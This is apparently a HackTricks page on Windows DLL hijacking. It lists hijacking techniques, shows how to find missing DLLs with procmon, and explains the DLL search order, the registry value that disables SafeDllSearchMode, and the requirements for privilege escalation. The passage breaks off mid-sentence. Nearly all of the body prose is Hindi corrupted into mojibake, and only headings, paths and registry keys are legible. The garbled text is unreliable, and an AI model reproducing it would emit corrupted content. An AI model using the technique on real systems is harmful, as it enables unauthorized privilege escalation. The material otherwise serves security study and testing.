# Dll Hijacking

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Basic Information

DLL Hijacking рдореЗрдВ рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг DLL рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЗрд░рдлреЗрд░ рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред рдпрд╣ рд╢рдмреНрдж рдХрдИ рд░рдгрдиреАрддрд┐рдпреЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ рдЬреИрд╕реЗ **DLL Spoofing, Injection, рдФрд░ Side-Loading**ред рдЗрд╕рдХрд╛ рдореБрдЦреНрдп рдЙрдкрдпреЛрдЧ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди, рд╕реНрдерд┐рд░рддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ, рдФрд░, рдХрдо рд╕рд╛рдорд╛рдиреНрдпрддрдГ, рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣рд╛рдБ рд╡реГрджреНрдзрд┐ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рд╡рдЬреВрдж, рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреА рд╡рд┐рдзрд┐ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рдмреАрдЪ рд╕рдорд╛рди рд░рд╣рддреА рд╣реИред

### Common Techniques

DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдХрдИ рд╡рд┐рдзрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдкреНрд░рддреНрдпреЗрдХ рдХреА рдкреНрд░рднрд╛рд╡рд╢реАрд▓рддрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ DLL рд▓реЛрдбрд┐рдВрдЧ рд░рдгрдиреАрддрд┐ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреА рд╣реИ:

1. **DLL Replacement**: рдПрдХ рдЕрд╕рд▓реА DLL рдХреЛ рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг DLL рдХреЗ рд╕рд╛рде рдмрджрд▓рдирд╛, рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ DLL Proxying рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдореВрд▓ DLL рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ рдмрдирд╛рдП рд░рдЦрдирд╛ред
2. **DLL Search Order Hijacking**: рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг DLL рдХреЛ рдПрдХ рдЦреЛрдЬ рдкрде рдореЗрдВ рд╡реИрдз DLL рд╕реЗ рдкрд╣рд▓реЗ рд░рдЦрдирд╛, рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдЦреЛрдЬ рдкреИрдЯрд░реНрди рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдирд╛ред
3. **Phantom DLL Hijacking**: рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг DLL рдмрдирд╛рдирд╛ рдЬрд┐рд╕реЗ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд▓реЛрдб рдХрд░реЗрдЧрд╛, рдпрд╣ рд╕реЛрдЪрдХрд░ рдХрд┐ рдпрд╣ рдПрдХ рдЧреИрд░-рдореМрдЬреВрдж рдЖрд╡рд╢реНрдпрдХ DLL рд╣реИред
4. **DLL Redirection**: рдЦреЛрдЬ рдкреИрд░рд╛рдореАрдЯрд░ рдЬреИрд╕реЗ `%PATH%` рдпрд╛ `.exe.manifest` / `.exe.local` рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рддрд╛рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг DLL рдХреА рдУрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
5. **WinSxS DLL Replacement**: WinSxS рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╡реИрдз DLL рдХреЛ рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рд╕рдордХрдХреНрд╖ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛, рдпрд╣ рд╡рд┐рдзрд┐ рдЕрдХреНрд╕рд░ DLL рд╕рд╛рдЗрдб-рд▓реЛрдбрд┐рдВрдЧ рд╕реЗ рдЬреБрдбрд╝реА рд╣реЛрддреА рд╣реИред
6. **Relative Path DLL Hijacking**: рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛-рдирд┐рдпрдВрддреНрд░рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг DLL рд░рдЦрдирд╛ рдЬрд┐рд╕рдореЗрдВ рдХреЙрдкреА рдХреА рдЧрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣реЛрддреА рд╣реИ, рдЬреЛ Binary Proxy Execution рддрдХрдиреАрдХреЛрдВ рдХреЗ рд╕рдорд╛рди рд╣реЛрддреА рд╣реИред

## Finding missing Dlls

рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЕрдВрджрд░ рдЧрд╛рдпрдм DLLs рдЦреЛрдЬрдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХрд╛ [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) рдХреЛ sysinternals рд╕реЗ рдЪрд▓рд╛рдирд╛ рд╣реИ, **рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд 2 рдлрд╝рд┐рд▓реНрдЯрд░ рд╕реЗрдЯ рдХрд░рдирд╛**:

![](<../../../.gitbook/assets/image (961).png>)

![](<../../../.gitbook/assets/image (230).png>)

рдФрд░ рдХреЗрд╡рд▓ **File System Activity** рджрд┐рдЦрд╛рдирд╛:

![](<../../../.gitbook/assets/image (153).png>)

рдпрджрд┐ рдЖрдк **рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдЧрд╛рдпрдм dlls** рдХреА рддрд▓рд╛рд╢ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рддреЛ рдЖрдк рдЗрд╕реЗ рдХреБрдЫ **рд╕реЗрдХрдВрдб** рдХреЗ рд▓рд┐рдП рдЪрд▓рдиреЗ рджреЗрдВред\
рдпрджрд┐ рдЖрдк рдПрдХ **рд╡рд┐рд╢рд┐рд╖реНрдЯ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдХреЗ рдЕрдВрджрд░ рдЧрд╛рдпрдм dll** рдХреА рддрд▓рд╛рд╢ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ **"Process Name" "contains" "\<exec name>"** рдЬреИрд╕реЗ **рджреВрд╕рд░реЗ рдлрд╝рд┐рд▓реНрдЯрд░** рдХреЛ рд╕реЗрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ, рдФрд░ рдШрдЯрдирд╛рдУрдВ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдирд╛ рдмрдВрдж рдХрд░реЗрдВред

## Exploiting Missing Dlls

рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рдореМрдХрд╛ рд╣реИ рдХрд┐ рд╣рдо **рдПрдХ dll рд▓рд┐рдЦ рд╕рдХреЗрдВ рдЬрд┐рд╕реЗ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧреА** рдХрд┐рд╕реА **рд╕реНрдерд╛рди рдкрд░ рдЬрд╣рд╛рдВ рдЗрд╕реЗ рдЦреЛрдЬрд╛ рдЬрд╛рдПрдЧрд╛**ред рдЗрд╕рд▓рд┐рдП, рд╣рдо **рдПрдХ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ dll рд▓рд┐рдЦрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдВрдЧреЗ** рдЬрд╣рд╛рдВ **dll рдкрд╣рд▓реЗ рдЦреЛрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ** рдЙрд╕ рдлрд╝реЛрд▓реНрдбрд░ рд╕реЗ рдкрд╣рд▓реЗ рдЬрд╣рд╛рдВ **рдореВрд▓ dll** рд╣реИ (рдЕрдЬреАрдм рдорд╛рдорд▓рд╛), рдпрд╛ рд╣рдо **рдХрд┐рд╕реА рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдВрдЧреЗ рдЬрд╣рд╛рдВ dll рдЦреЛрдЬрд╛ рдЬрд╛рдПрдЧрд╛** рдФрд░ рдореВрд▓ **dll рдХрд┐рд╕реА рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ**ред

### Dll Search Order

**Microsoft рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЗ рдЕрдВрджрд░** [**рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ DLLs рдХреЛ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдХреИрд╕реЗ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)

**Windows рдПрдкреНрд▓рд┐рдХреЗрд╢рди** DLLs рдХреА рдЦреЛрдЬ рдПрдХ рд╕реЗрдЯ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдХрд░рддреЗ рд╣реИрдВ **рдкреВрд░реНрд╡-рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдЦреЛрдЬ рдкрде**, рдПрдХ рд╡рд┐рд╢реЗрд╖ рдЕрдиреБрдХреНрд░рдо рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реБрдПред DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреА рд╕рдорд╕реНрдпрд╛ рддрдм рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИ рдЬрдм рдПрдХ рд╣рд╛рдирд┐рдХрд╛рд░рдХ DLL рдЗрди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдореЗрдВ рд╕реЗ рдПрдХ рдореЗрдВ рд░рдгрдиреАрддрд┐рдХ рд░реВрдк рд╕реЗ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реБрдП рдХрд┐ рдЗрд╕реЗ рдкреНрд░рд╛рдорд╛рдгрд┐рдХ DLL рд╕реЗ рдкрд╣рд▓реЗ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рдПред рдЗрд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рдорд╛рдзрд╛рди рдпрд╣ рд╣реИ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЖрд╡рд╢реНрдпрдХ DLLs рдХрд╛ рд╕рдВрджрд░реНрдн рджреЗрддреЗ рд╕рдордп рдкреВрд░реНрдг рдкрде рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

рдЖрдк 32-рдмрд┐рдЯ рд╕рд┐рд╕реНрдЯрдо рдкрд░ **DLL рдЦреЛрдЬ рдХреНрд░рдо** рдиреАрдЪреЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:

1. рд╡рд╣ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдЬрд┐рд╕рд╕реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд▓реЛрдб рд╣реБрдЖред
2. рд╕рд┐рд╕реНрдЯрдо рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдкрде рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред(_C:\Windows\System32_)
3. 16-рдмрд┐рдЯ рд╕рд┐рд╕реНрдЯрдо рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдкрде рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рдлрд╝рдВрдХреНрд╢рди рдирд╣реАрдВ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рдЦреЛрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред (_C:\Windows\System_)
4. Windows рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдкрде рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
1. (_C:\Windows_)
5. рд╡рд░реНрддрдорд╛рди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред
6. PATH рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдореЗрдВ рд╕реВрдЪреАрдмрджреНрдз рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕рдореЗрдВ **App Paths** рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдкреНрд░рддрд┐-рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрде рд╢рд╛рдорд┐рд▓ рдирд╣реАрдВ рд╣реИред DLL рдЦреЛрдЬ рдкрде рдХреА рдЧрдгрдирд╛ рдХрд░рддреЗ рд╕рдордп **App Paths** рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдпрд╣ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рдЦреЛрдЬ рдХреНрд░рдо рд╣реИ рдЬрдм **SafeDllSearchMode** рд╕рдХреНрд╖рдо рд╣реИред рдЬрдм рдЗрд╕реЗ рдЕрдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╡рд░реНрддрдорд╛рди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рджреВрд╕рд░реЗ рд╕реНрдерд╛рди рдкрд░ рдмрдврд╝ рдЬрд╛рддреА рд╣реИред рдЗрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдорд╛рди рдмрдирд╛рдПрдВ рдФрд░ рдЗрд╕реЗ 0 рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдХреНрд╖рдо рд╣реИ)ред

рдпрджрд┐ [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) рдлрд╝рдВрдХреНрд╢рди рдХреЛ **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** рдХреЗ рд╕рд╛рде рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдЦреЛрдЬ рдЙрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╢реБрд░реВ рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдореЙрдбреНрдпреВрд▓ рд╣реИ рдЬрд┐рд╕реЗ **LoadLibraryEx** рд▓реЛрдб рдХрд░ рд░рд╣рд╛ рд╣реИред

рдЕрдВрдд рдореЗрдВ, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдПрдХ dll рдХреЛ рдХреЗрд╡рд▓ рдирд╛рдо рдХреЗ рдмрдЬрд╛рдп рдкреВрд░реНрдг рдкрде рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддреЗ рд╣реБрдП рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рдЙрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╡рд╣ dll **рдХреЗрд╡рд▓ рдЙрд╕ рдкрде рдореЗрдВ рдЦреЛрдЬрд╛ рдЬрд╛рдПрдЧрд╛** (рдпрджрд┐ dll рдХреА рдХреЛрдИ рдирд┐рд░реНрднрд░рддрд╛рдПрдБ рд╣реИрдВ, рддреЛ рдЙрдиреНрд╣реЗрдВ рдХреЗрд╡рд▓ рдирд╛рдо рд╕реЗ рд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рдорд╛рдирд╛ рдЬрд╛рдПрдЧрд╛)ред

рдЦреЛрдЬ рдХреНрд░рдо рдХреЛ рдмрджрд▓рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдореИрдВ рдЙрдиреНрд╣реЗрдВ рдпрд╣рд╛рдБ рд╕рдордЭрд╛рдиреЗ рдирд╣реАрдВ рдЬрд╛ рд░рд╣рд╛ рд╣реВрдБред

#### Exceptions on dll search order from Windows docs

Windows рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рдорд╛рдирдХ DLL рдЦреЛрдЬ рдХреНрд░рдо рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдЕрдкрд╡рд╛рдж рдиреЛрдЯ рдХрд┐рдП рдЧрдП рд╣реИрдВ:

* рдЬрдм рдПрдХ **DLL рдЬрд┐рд╕рдХрд╛ рдирд╛рдо рдкрд╣рд▓реЗ рд╕реЗ рдореЗрдореЛрд░реА рдореЗрдВ рд▓реЛрдб рдХреА рдЧрдИ рдПрдХ DLL рдХреЗ рд╕рд╛рде рд╕рд╛рдЭрд╛ рд╣реЛрддрд╛ рд╣реИ** рдХрд╛ рд╕рд╛рдордирд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╕рд┐рд╕реНрдЯрдо рд╕рд╛рдорд╛рдиреНрдп рдЦреЛрдЬ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдмрдЬрд╛рдп, рдпрд╣ рдкрд╣рд▓реЗ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдФрд░ рдПрдХ рдореИрдирд┐рдлреЗрд╕реНрдЯ рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ, рдлрд┐рд░ рдореЗрдореЛрд░реА рдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рдореМрдЬреВрдж DLL рдкрд░ рд▓реМрдЯрддрд╛ рд╣реИред **рдЗрд╕ рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ, рд╕рд┐рд╕реНрдЯрдо DLL рдХреЗ рд▓рд┐рдП рдЦреЛрдЬ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ**ред
* рдпрджрд┐ DLL рдХреЛ рд╡рд░реНрддрдорд╛рди Windows рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рд▓рд┐рдП **рдЬреНрдЮрд╛рдд DLL** рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╕рд┐рд╕реНрдЯрдо рдЬреНрдЮрд╛рдд DLL рдХреЗ рдЕрдкрдиреЗ рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛, рд╕рд╛рде рд╣реА рдЗрд╕рдХреА рдХрд┐рд╕реА рднреА рдирд┐рд░реНрднрд░ DLLs рдХрд╛, **рдЦреЛрдЬ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЫреЛрдбрд╝рдХрд░**ред рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** рдЗрди рдЬреНрдЮрд╛рдд DLLs рдХреА рдПрдХ рд╕реВрдЪреА рд░рдЦрддреА рд╣реИред
* рдпрджрд┐ рдПрдХ **DLL рдореЗрдВ рдирд┐рд░реНрднрд░рддрд╛рдПрдБ рд╣реИрдВ**, рддреЛ рдЗрди рдирд┐рд░реНрднрд░ DLLs рдХреА рдЦреЛрдЬ рдЗрд╕ рддрд░рд╣ рдХреА рдЬрд╛рддреА рд╣реИ рдЬреИрд╕реЗ рдХрд┐ рдЙрдиреНрд╣реЗрдВ рдХреЗрд╡рд▓ рдЙрдирдХреЗ **рдореЙрдбреНрдпреВрд▓ рдирд╛рдореЛрдВ** рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ, рдЪрд╛рд╣реЗ рдкреНрд░рд╛рд░рдВрднрд┐рдХ DLL рдХреЛ рдкреВрд░реНрдг рдкрде рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣рдЪрд╛рдирд╛ рдЧрдпрд╛ рд╣реЛ рдпрд╛ рдирд╣реАрдВред

### Escalating Privileges

**Requirements**:

* рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдВ рдЬреЛ **рд╡рд┐рднрд┐рдиреНрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ** (рдХреНрд╖реИрддрд┐рдЬ рдпрд╛ рдкрд╛рд░реНрд╢реНрд╡ рдЖрдВрджреЛрд▓рди) рдХреЗ рддрд╣рдд рдХрд╛рд░реНрдп рдХрд░рддреА рд╣реИ рдпрд╛ рдХрд░реЗрдЧреА, рдЬреЛ **рдПрдХ DLL** рдХреА рдХрдореА рд╣реИред
* рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ **рдХрд┐рд╕реА рднреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛** рдХреЗ рд▓рд┐рдП **рд▓реЗрдЦрди рдкрд╣реБрдВрдЪ** рдЙрдкрд▓рдмреНрдз рд╣реИ рдЬрд┐рд╕рдореЗрдВ **DLL** рдХреЗ рд▓рд┐рдП **рдЦреЛрдЬ рдХреА рдЬрд╛рдПрдЧреА**ред рдпрд╣ рд╕реНрдерд╛рди рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдХрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдпрд╛ рд╕рд┐рд╕реНрдЯрдо рдкрде рдХреЗ рднреАрддрд░ рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

рд╣рд╛рдБ, рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ рдЦреЛрдЬрдирд╛ рдЬрдЯрд┐рд▓ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдпрд╣ рдереЛрдбрд╝рд╛ рдЕрдЬреАрдм рд╣реИ рдХрд┐ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдореЗрдВ рдПрдХ dll рдХреА рдХрдореА рд╣реЛ** рдФрд░ рдпрд╣ рдФрд░ рднреА **рдЕрдЬреАрдм рд╣реИ рдХрд┐ рдПрдХ рд╕рд┐рд╕реНрдЯрдо рдкрде рдлрд╝реЛрд▓реНрдбрд░ рдкрд░ рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрдВ** (рдЖрдк рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ)ред рд▓реЗрдХрд┐рди, рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдпрд╣ рд╕рдВрднрд╡ рд╣реИред\
рдпрджрд┐ рдЖрдк рднрд╛рдЧреНрдпрд╢рд╛рд▓реА рд╣реИрдВ рдФрд░ рдЖрдк рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ рдкреВрд░рд╛ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк [UACME](https://github.com/hfiref0x/UACME) рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рднрд▓реЗ рд╣реА **рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХрд╛ рдореБрдЦреНрдп рд▓рдХреНрд╖реНрдп UAC рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛ рд╣реИ**, рдЖрдк рд╡рд╣рд╛рдВ рдПрдХ **PoC** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ Windows рд╕рдВрд╕реНрдХрд░рдг 